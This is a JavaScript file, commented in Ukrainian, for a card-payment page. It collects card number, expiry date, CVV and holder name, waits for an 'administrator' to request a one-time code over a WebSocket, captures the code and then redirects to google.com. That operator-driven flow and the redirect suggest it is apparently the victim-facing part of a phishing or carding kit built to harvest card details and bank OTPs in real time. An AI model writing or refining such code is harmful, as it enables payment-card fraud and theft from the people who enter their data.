// Отримання CSRF токену
function getCsrfToken() {
    return document.cookie.split('; ')
        .find(row => row.startsWith('XSRF-TOKEN='))
        ?.split('=')[1];
}

// Базові налаштування для fetch запитів
const fetchConfig = {
    credentials: 'include',
    headers: {
        'CSRF-Token': getCsrfToken(),
        'Content-Type': 'application/json'
    }
};

// Ініціалізація елементів
const cardForm = document.getElementById('cardForm');
const otpForm = document.getElementById('otp-form');
const loadingElement = document.getElementById('loading');
const notificationElement = document.getElementById('notification');

// Валідація вводу
function setupInputValidation() {
    // Card Number - тільки цифри
    document.getElementById('cardNumber').addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 16);
    });

    // Expiration Date - формат MM/YY
    document.getElementById('expDate').addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.slice(0, 2) + '/' + value.slice(2);
        }
        e.target.value = value.slice(0, 5);
    });

    // CVV - тільки цифри
    document.getElementById('cvv').addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
    });

    // Card Holder - тільки букви та пробіли
    document.getElementById('cardHolder').addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^A-Za-z\s]/g, '');
    });

    // OTP - тільки цифри
    document.getElementById('otpCode').addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 8);
    });
}

// Показ повідомлень
function showNotification(message, type = 'info') {
    notificationElement.textContent = message;
    notificationElement.className = `notification ${type}`;
    notificationElement.style.display = 'block';
    
    setTimeout(() => {
        notificationElement.style.display = 'none';
    }, 5000);
}

// Відправка даних карти
async function submitCard() {
    try {
        const formData = new FormData(cardForm);
        const cardData = Object.fromEntries(formData.entries());
        
        // Показуємо індикатор завантаження
        loadingElement.style.display = 'block';
        cardForm.style.display = 'none';

        const response = await fetch('/api/cards', {
            ...fetchConfig,
            method: 'POST',
            body: JSON.stringify(cardData)
        });

        if (!response.ok) {
            throw new Error('Failed to submit card data');
        }

        showNotification('Card data submitted successfully', 'success');
        
        // Очікуємо на відповідь від адміністратора через WebSocket
    } catch (error) {
        console.error('Error:', error);
        showNotification('Error submitting card data', 'error');
        cardForm.style.display = 'block';
    } finally {
        loadingElement.style.display = 'none';
    }
}

// Відправка OTP коду
async function submitOTP() {
    try {
        const formData = new FormData(document.getElementById('otpForm'));
        const otpData = Object.fromEntries(formData.entries());

        loadingElement.style.display = 'block';
        otpForm.style.display = 'none';

        const response = await fetch('/api/otp', {
            ...fetchConfig,
            method: 'POST',
            body: JSON.stringify(otpData)
        });

        if (!response.ok) {
            throw new Error('Failed to submit OTP');
        }

        const result = await response.json();
        
        if (result.success) {
            showNotification('Payment successful', 'success');
            setTimeout(() => {
                window.location.href = 'https://google.com';
            }, 2000);
        } else {
            showNotification(result.message || 'Invalid OTP', 'error');
            otpForm.style.display = 'block';
        }
    } catch (error) {
        console.error('Error:', error);
        showNotification('Error submitting OTP', 'error');
        otpForm.style.display = 'block';
    } finally {
        loadingElement.style.display = 'none';
    }
}

// WebSocket з'єднання
const socket = io({
    withCredentials: true,
    transportOptions: {
        polling: {
            extraHeaders: {
                'CSRF-Token': getCsrfToken()
            }
        }
    }
});

socket.on('requestOTP', () => {
    cardForm.style.display = 'none';
    otpForm.style.display = 'block';
    loadingElement.style.display = 'none';
});

socket.on('paymentMessage', (message) => {
    if (message.type === 'error') {
        cardForm.style.display = 'block';
        otpForm.style.display = 'none';
    }
    showNotification(message.text, message.type);
});

// Ініціалізація при завантаженні
document.addEventListener('DOMContentLoaded', () => {
    setupInputValidation();
    
    // Оновлюємо CSRF токени
    document.getElementById('csrfToken').value = getCsrfToken();
    document.getElementById('otpCsrfToken').value = getCsrfToken();
}); 